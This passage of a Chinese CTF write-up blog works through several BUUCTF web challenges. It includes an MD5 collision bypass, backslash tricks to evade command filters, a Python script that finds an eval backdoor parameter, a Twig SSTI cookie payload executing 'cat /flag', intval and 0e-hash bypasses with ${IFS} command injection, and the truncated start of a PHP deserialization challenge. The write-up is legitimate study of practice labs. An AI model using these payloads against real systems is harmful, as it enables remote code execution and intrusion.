<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3&amp;b=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3</span><br></pre></td></tr></table></figure>

<p>运行一下,响应包中没有<code>forbid ~</code>, 说明成功绕过了<code>md5</code>强比较</p>
<img src="/images/buuctf-web/image-20221020163652761-1667047819735123.png" alt="image-20221020163652761" style="zoom:80%;" />

<p>下一步该考虑怎样绕过过滤字符来执行命令了</p>
<p>知识点: php中<code>preg_match</code>这里对反斜杠的过滤是有问题的</p>
<p>对反引号的检测无效，而在Linux中，反引号对一些命令也几乎没有影响</p>
<p>所以在常规命令里加一个反斜杠,一方面反斜杠无法被过滤,另一方面也导致命令也不会被过滤了:</p>
<img src="/images/buuctf-web/image-20221020164005294-1667047819735124.png" alt="image-20221020164005294" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=l\s+/   相当于执行了ls /   这里`+`是url中的连接符</span><br><span class="line">cmd=ca\t+/flag  </span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020164200800-1667047819735125.png" alt="image-20221020164200800" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="脚本爆破-高明的黑客"><a href="#脚本爆破-高明的黑客" class="headerlink" title="[脚本爆破]高明的黑客"></a>[脚本爆破]高明的黑客</h1><h2 id="写脚本遍历"><a href="#写脚本遍历" class="headerlink" title="写脚本遍历"></a>写脚本遍历</h2><img src="/images/buuctf-web/image-20221020171427555-1667047819735126.png" alt="image-20221020171427555" style="zoom:67%;" />

<p>下载<code>www.tar.gz</code>后查看源码,发现变量名和文件名等等都被混淆过,完全没法读懂代码</p>
<p>简单看一下,搜索一下敏感函数,发现存在很多<code>eval</code>直接执行GET和POST参数的情况:</p>
<img src="/images/buuctf-web/image-20221020172010484-1667047819735127.png" alt="image-20221020172010484" style="zoom:67%;" />

<p>那么很可能存在命令执行漏洞,现在需要找出哪个具体文件的具体参数会导致命令执行</p>
<p>把网站源码放在本地跑起来,便于测试:</p>
<img src="/images/buuctf-web/image-20221020172210664-1667047819735128.png" alt="image-20221020172210664" style="zoom:67%;" />





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        file_content = f.read()</span><br><span class="line">        get_x = re.findall(r&quot;\$\_GET\[&#x27;(.*?)&#x27;\]&quot;, file_content)</span><br><span class="line">        post_x = re.findall(r&quot;\$\_POST\[&#x27;(.*?)&#x27;\]&quot;, file_content)</span><br><span class="line">        print(get_x)</span><br><span class="line">        print(post_x)</span><br><span class="line"></span><br><span class="line">[&#x27;XSDcSaffEbx6oZ&#x27;, &#x27;oz6Ej9P&#x27;, &#x27;az3R5f5s4&#x27;, &#x27;odtEQDItUT&#x27;, &#x27;NSgdqC&#x27;, &#x27;H4is8Z3LRoABM&#x27;, &#x27;ilv84RCQ&#x27;, &#x27;lww0c2Cx7y4TSRGi&#x27;, &#x27;Kwz6bXz2M&#x27;, &#x27;aNumqn2f&#x27;, &#x27;Fqb2uSrO8LMMB&#x27;, &#x27;jDT01_l&#x27;, &#x27;goch7KojU7T&#x27;, &#x27;qWm5RvJUt&#x27;, &#x27;qWm5RvJUt&#x27;, &#x27;BORTqm2Eo7A&#x27;, &#x27;nNSyzVRp1&#x27;, &#x27;nNSyzVRp1&#x27;, &#x27;fF8bAiWdOBLwZL9&#x27;, &#x27;frGFotiaH&#x27;, &#x27;hI7_X5i4R&#x27;, &#x27;hI7_X5i4R&#x27;, &#x27;FTxP0MHycmnFRtpz&#x27;, &#x27;Epwu9JxhOy&#x27;, &#x27;HyXW_N_4K2c&#x27;, &#x27;rdxi8mF&#x27;, &#x27;Ej3PC3fzf&#x27;, &#x27;JuB3q6twZW&#x27;, &#x27;yvBMQa0&#x27;, &#x27;iz6OwNzo3akf0&#x27;, &#x27;FR7mSIquukKmAHcB&#x27;, &#x27;x0ySdn&#x27;, &#x27;P1xbo5J6PutjgW&#x27;, &#x27;WJItkno6C&#x27;, &#x27;K3fy91AWDXdjly7&#x27;, &#x27;kI8X1sjYP&#x27;, &#x27;cbbhyBPGJ3omu&#x27;]</span><br><span class="line">[&#x27;c9tNeilUCYtuI_rW&#x27;, &#x27;GeSLNjbPhXFZTiU&#x27;, &#x27;zSBU5aRPV&#x27;, &#x27;EAwdIy7bl&#x27;, &#x27;bcWLBqVE&#x27;, &#x27;McfP0gwMy1Os&#x27;, &#x27;pIUHGWlCT_q&#x27;, &#x27;M5fIjgYMC1sybG3&#x27;, &#x27;KNzF8hev3&#x27;, &#x27;WGl60iQiCS&#x27;, &#x27;LdfrqXGQVtS&#x27;, &#x27;TETrtgSbwwSzl&#x27;, &#x27;nCXHgSWve&#x27;, &#x27;SzHhNCR76__IZY&#x27;, &#x27;rqVPmr&#x27;, &#x27;vuXMcABwIGPtivYT&#x27;, &#x27;VCXnjK4Qo5L2NKL&#x27;, &#x27;eoOoQHH1c&#x27;, &#x27;XystQX6Go_qu&#x27;, &#x27;fbcvPysDv&#x27;, &#x27;y4J9xESQbt_xvL8H&#x27;, &#x27;zRimyMWsH9ukp&#x27;, &#x27;axQvvHWB_1hdC&#x27;, &#x27;MfhwcPtHxG_GG4&#x27;, &#x27;zbVFQDcHKqZz9eR&#x27;, &#x27;K4w8M3WWbLtt_m4x&#x27;, &#x27;cZN6BUQ&#x27;, &#x27;qz9u5FQC5&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写一个脚本来测试出问题的是哪个文件中的哪个参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">filelist = os.listdir(<span class="string">&quot;./src&quot;</span>)</span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:8090/src/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;echo &#x27;ffffllllaaaagggg&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./src/&quot;</span>+file, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read()</span><br><span class="line">        get_x = re.findall(<span class="string">r&quot;\$\_GET\[&#x27;(.*?)&#x27;\]&quot;</span>, file_content)<span class="comment"># 正则匹配出当前文件中所有的get参数名</span></span><br><span class="line">        post_x = re.findall(<span class="string">r&quot;\$\_POST\[&#x27;(.*?)&#x27;\]&quot;</span>, file_content)<span class="comment"># 正则匹配出当前文件中所有的post参数名</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"></span><br><span class="line">        data = &#123;&#125;  <span class="comment"># 用来post的参数</span></span><br><span class="line">        params = &#123;&#125;  <span class="comment"># 用来get的参数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> get_x:</span><br><span class="line">            params[i] = payload</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> post_x:</span><br><span class="line">            data[j] = payload</span><br><span class="line">        url = base_url+file</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        session0 = requests.session()</span><br><span class="line">        response = session0.post(url, data=data, params=params).text   <span class="comment"># 外层,测试可利用的是哪个文件</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))   <span class="comment"># 内层,测试可利用的是这个文件里的哪个参数</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> param <span class="keyword">in</span> get_x:<span class="comment"># 测试get参数</span></span><br><span class="line">                session1 = requests.session()</span><br><span class="line">                params_per = &#123;param: payload&#125;</span><br><span class="line">                res = session1.get(url, params=params_per).text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(param))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> data <span class="keyword">in</span> post_x:<span class="comment"># 测试post参数</span></span><br><span class="line">                session2 = requests.session()</span><br><span class="line">                data_per = &#123;data: payload&#125;</span><br><span class="line">                res = session2.post(url, data=data_per).text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<img src="/images/buuctf-web/image-20221020181021597.png" alt="image-20221020181021597" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this!!!!!!!!xk0SzyKwfzw.php</span><br><span class="line">this!!!!!!!Efa5BVG</span><br></pre></td></tr></table></figure>

<p>接下来直接借助这个参数执行命令就可以了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=ls /</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020181610785-1667047819735129.png" alt="image-20221020181610785" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="Cookie-SSTI-Cookie-is-so-stable"><a href="#Cookie-SSTI-Cookie-is-so-stable" class="headerlink" title="[Cookie-SSTI]Cookie is so stable"></a>[Cookie-SSTI]Cookie is so stable</h1><p>进来之后<code>hint</code>中提示说看一下<code>cookies</code>,所以抓包看一下<code>cookie</code></p>
<p>经过抓包可以看出,在<code>Flag</code>页面输入的字符串会出现在回显页面上, 那么这题考的应该是<code>SSTI</code></p>
<img src="/images/buuctf-web/image-20221020212947194-1667047819735130.png" alt="image-20221020212947194" style="zoom:67%;" />

<p>尝试判断一下网站的类型:</p>
<img src="/images/buuctf-web/1-1667047819735131.png" alt="image-20221016171017464" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=$&#123;7*7&#125;  没有运算,直接输出</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020210024205-1667047819735132.png" alt="image-20221020210024205" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;7*7&#125;&#125; 运算了</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020210112518-1667047819735133.png" alt="image-20221020210112518" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; 运算了</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020210150775-1667047819735134.png" alt="image-20221020210150775" style="zoom:80%;" />

<p>这样以来, 网站框架应该是<code>Twig(php)</code>或者<code>Jinja2(python)</code></p>
<p>直接找对应的payload过来尝试,目标是执行命令<code>cat /flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020212707869.png" alt="image-20221020212707869" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="intvalr绕过-md5爆破-朴实无华"><a href="#intvalr绕过-md5爆破-朴实无华" class="headerlink" title="[intvalr绕过,md5爆破]朴实无华"></a>[intvalr绕过,md5爆破]朴实无华</h1><img src="/images/buuctf-web/image-20221020222547896.png" alt="image-20221020222547896" style="zoom:80%;" />

<p>访问<code>robots.txt</code>:</p>
<img src="/images/buuctf-web/image-20221020222618709.png" alt="image-20221020222618709" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure>

<p>访问一下这个文件:</p>
<img src="/images/buuctf-web/image-20221020222910649-1667047819736135.png" alt="image-20221020222910649" style="zoom:67%;" />

<p>抓包又发现了一个文件:</p>
<img src="/images/buuctf-web/image-20221020223050808-1667047819736136.png" alt="image-20221020223050808" style="zoom:67%;" />

<p>访问得到了源码: (做的时候汉字乱码了..直接网上找了一个..)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123; <span class="comment">// get_flag中不能有空格</span></span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>); <span class="comment">//将cat换成wctf2020</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>level1:</code> <code>intval</code>获取变量整数值</p>
<p>这里<code>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</code> 可以利用运算时进行转换的性质</p>
<p>例如传<code>123e12</code>, <code>intval($num)</code>时,取到字母就会停止,所以是123</p>
<p>但是在进行运算时,会把它整体强制转换成数值,<strong>这里的<code>e</code>会被当成科学计数法</strong>,所以<code>intval($num + 1) &gt; 2021</code>也成立</p>
<br>

<p><code>level2</code>中,首先需要一个<code>md5</code>计算后等于原值的值,这里利用</p>
<p><code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0   这个性质</p>
<p>需要找一个以<code>0e</code>开头,且<code>md5</code>计算后仍为<code>0e</code>开头的字符串,且除了<code>0e</code>之外必须全是数字</p>
<p>这里只能用脚本碰撞了:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    a = <span class="string">&#x27;0e&#x27;</span> + <span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    m = <span class="title function_ invoke__">md5</span>(a.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> m[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> m[<span class="number">2</span>:].<span class="title function_ invoke__">isdigit</span>():</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;OK!!!!!!!!!1&#x27;</span>,a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ed5aace2-3cdb-472b-9bd0-c403a02807ad.node4.buuoj.cn:81/fl4g.php?num=123e12&amp;md5=0e215962017&amp;get_flag=ls</span><br><span class="line">输出:</span><br><span class="line">404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fl4g.php?num=123e12&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020230400979.png" alt="image-20221020230400979" style="zoom:80%;" />





<br>

<hr>
<br>

<h1 id="长度减少的反序列化字符串逃逸-easy-serialize-php"><a href="#长度减少的反序列化字符串逃逸-easy-serialize-php" class="headerlink" title="[长度减少的反序列化字符串逃逸]easy_serialize_php"></a>[长度减少的反序列化字符串逃逸]easy_serialize_php</h1><p>进来点链接,有源码,url中用参数<code>f</code>传了一个调用的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?f=highlight_file</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>; <span class="comment">//将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>); <span class="comment">//将匹配到的替换为空,这里只是替换的化可以双写绕过</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>); <span class="comment">//将数组(字典)中的每个元素解析为单独的变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span 